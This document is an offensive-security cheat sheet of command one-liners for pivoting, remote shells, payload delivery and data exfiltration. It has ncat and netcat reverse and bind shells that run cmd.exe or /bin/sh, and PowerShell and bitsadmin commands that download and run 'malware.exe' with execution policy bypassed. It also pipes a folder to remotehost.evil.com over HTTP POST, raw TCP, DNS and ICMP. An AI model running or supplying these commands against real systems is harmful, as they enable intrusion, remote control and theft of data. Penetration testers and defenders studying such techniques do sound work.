# SSH
ssh -L 8080:127.0.0.1:80 root@192.168.1.7 # Local Port
ssh -R 8080:127.0.0.1:80 root@192.168.1.7 # Remote Port
ssh -D 127.0.0.1:9050 -N [username]@[ip] # proxychains (command)

# Reverse ssh tunnel from compromised host to Kali using dynamic port forwarding
ssh -f -N 2222:127.0.0.1:22 root@208.68.234.100

# Ncat
ncat --exec cmd.exe --allow 10.0.0.1 -vnl 4444 --ssl
ncat -v 10.0.0.2 4444 --ssl
ncat --allow 10.11.9.125 -vnl 4444 --ssl
ncat 10.11.0.31 4444 --exec cmd.exe --ssl
ncat.exe --exec  cmd.exe --allow 192.168.14.177 -vnl 444 --ssl

# NetCat
mknod backpipe p ; nc -l -p 8080 < backpipe | nc 10.5.5.151 80 >backpipe backpipe

# Port 80 to 8080
mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow & 1>backpipe Proxy 
nc -lvp 4444; nc -lvp 4445; telnet 192.168.14.177 4444 | /bin/sh | 192.168.15.205 4445 get shell

# Is port-forwarding or redirection possible
FPipe.exe -l 80 -r 80 -s 80 $ip 

# Shovel an RDP session
plink.exe -l root -pw secretpassword 10.11.0.30 -R 3390:127.0.0.1:3389

ssh -f -N 2222:127.0.0.1:22 root@$ip
ssh -L 8080:127.0.0.1:80 root@$ip
ssh -R 8080:127.0.0.1:80 root@$ip
mknod backpipe p ; nc -l -p 8080 < backpipe | $ip 80 >backpipe
mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow & 1>backpipe
ssh -D 127.0.0.1:9050 -N [username]@[ip]
FPipe.exe -l 80 -r 80 -s 80 $ip
nc -lvp 4444; nc -lvp 4445; telnet $ip 4444 | /bin/sh | $ip 4445


# BitsAdmin (download & execute)
cmd.exe /c "bitsadmin /transfer myjob /download /priority high hxxp://192.168.14.177/malware.exe c:\malware.exe&start malware.exe"

Start-BitsTransfer -Source c:\clienttestdir\testfile1.txt -Destination https://server01/servertestdir/testfile1.txt
-TransferType Upload -cred (get-credential)

# PowerShell (download & execute)
cmd.exe /c "powershell (new-object system.net.webclient).downloadfile('hxxp://192.168.14.177/malware.exe','malware.exe');(new-object -com shell.application).shellexecute('malware.exe')"

echo $storageDir = $pwd > wget.ps1
echo $webclient = New-Object System.Net.WebClient >>wget.ps1
echo $url = "hxxp://192.168.10.5/evil.exe" >>wget.ps1
echo $file = "new-exploit.exe" >>wget.ps1
echo $webclient.DownloadFile($url,$file) >>wget.ps1
powershell.exe -ep Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1

echo $client = New-Object System.Net.WebClient > script.ps1
echo $targetlocation = "http://192.168.56.102/PsExec.exe" >> script.ps1
echo $client.DownloadFile($targetlocation,"psexec.exe") >> script.ps1
powershell.exe -ExecutionPolicy Bypass -NonInteractive -File script.ps1

# FTP
echo open 10.11.0.30 21> ftp1.txt
echo USER offsec>> ftp1.txt
echo sendit>> ftp1.txt
echo bin>> ftp1.txt
echo GET nc.exe>> ftp1.txt
echo bye>> ftp1.txt
ftp -v -n -s:ftp1.txt

# SSH
tar zcf - localfolder | ssh remotehost.evil.com "cd /path/name; tar zxpf -"

# POST
tar zcf - localfolder | curl -F "data=@-" hxxps://remotehost.evil.com/script.php

# Raw TCP
tar zcf - localfolder >/dev/tcp/remotehost.evil.com/443

# Hex
tar zcf - localfolder | xxd -p >/dev/tcp/remotehost.evil.com/443

# EBCDIC over Base64
tar zcf - localfolder | base 64 | dd conv=ebcdic >/dev/tcp/remotehost.evil.com/443

# DNS
tar zcf - localfolder | xxd -p -c 16 | while read line; do host $line.domain.com remotehost.evil.com; done

# ICMP
tar zcf - localfolder | xxd -p -c 16 | while read line; do ping -p $line -c 1 -q remotehost.evil.com; done

# SCP
scp -r -p /localfolder user@destination:/path/to/folder

# TFTP
tftp -i 10.10.10.10 get nc.exe